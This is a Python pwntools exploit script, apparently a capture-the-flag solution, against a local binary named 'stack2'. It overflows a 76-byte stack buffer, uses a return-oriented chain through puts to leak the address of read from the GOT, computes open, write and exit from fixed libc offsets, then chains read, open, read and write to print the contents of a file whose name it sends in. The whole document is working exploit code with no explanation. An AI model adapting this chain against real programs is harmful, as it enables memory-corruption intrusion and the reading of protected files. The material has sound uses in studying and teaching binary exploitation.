from pwn import *
p = process("./stack2")
 
PPPR=0x08049401
PPR=0x08049402
PR=0x08049403
BUF=0x804c500 

num=76
payload = b'A' * num
payload2 =b'A' * num
 
putplt=0x8049110  #put.plt
readgot=0x804c010 #read.got
payload2 += p32(putplt)
payload2 += p32(PR)
payload2 += p32(readgot)
 
#main
payload2 += p32(0x804931f)
 
p.sendline(payload2)
 
p.recvuntil("!\n")
leak=p.recv(4)
readAddr=int.from_bytes(leak,"little")
 
#open-read+readAddr
openAddr=0x000f1740-0x000f1b60+readAddr
writeAddr=0x000f1c00-0x000f1b60+readAddr
exitAddr=0x000340d0-0x000f1b60+readAddr

#read
payload += p32(readAddr)
payload += p32(PPPR)
payload += p32(0)
payload += p32(BUF)
payload += p32(9)
 
#open
payload += p32(openAddr)
payload += p32(PPR)
payload += p32(BUF)
payload += p32(0)
 
#read
payload += p32(readAddr)
payload += p32(PPPR)
payload += p32(3)
payload += p32(BUF)
payload += p32(8)
 
#write
payload += p32(writeAddr)
payload += p32(PPPR)
payload += p32(1)
payload += p32(BUF)
payload += p32(8)
 
#exit
payload += p32(exitAddr)
payload += p32(0xdeadbeef)
payload += p32(1)
 
p.sendline(payload)
p.interactive()